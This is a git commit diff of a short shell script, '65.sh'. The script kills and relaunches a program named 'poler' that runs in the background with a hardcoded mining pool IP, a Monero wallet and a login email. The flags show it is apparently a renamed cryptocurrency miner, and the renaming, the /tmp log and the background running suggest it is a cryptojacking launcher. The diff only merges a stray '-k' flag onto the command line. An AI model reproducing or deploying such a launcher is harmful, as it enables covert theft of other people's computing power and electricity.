c72c1b018b4d6837511191bd50a7d1469ce2aa42
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-06-22 16:16:13 +0000

    Update 65.sh

--- 65.sh
+++ 65.sh
@@ -1,5 +1,4 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 77 --cpu-priority 5 -o 109.234.36.164:5931 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=sasasa:faker85552@gmail.com
- -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 77 --cpu-priority 5 -o 109.234.36.164:5931 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=sasasa:faker85552@gmail.com -k
 
